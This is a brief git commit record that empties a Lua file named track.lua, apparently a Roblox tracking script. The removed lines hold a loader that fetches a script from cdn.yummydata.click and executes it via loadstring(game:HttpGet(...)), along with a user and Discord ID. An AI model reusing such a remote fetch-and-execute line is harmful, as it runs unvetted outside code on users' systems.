8390d678ac993ef3d0bacc884d7324a576930a17
huychu1312 <chuhuy1312@gmail.com>
2026-08-17 23:33:05 +0700

    Update track.lua

--- track.lua
+++ track.lua
@@ -1,2 +1,1 @@
-task.wait(30)
-_G.Config={UserID="f33e21df-0fbb-4a67-8d67-ff73a4303ef4",discord_id="993062998652493824",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/trackstatblox"))()end)if s then break end wait(5)end
+
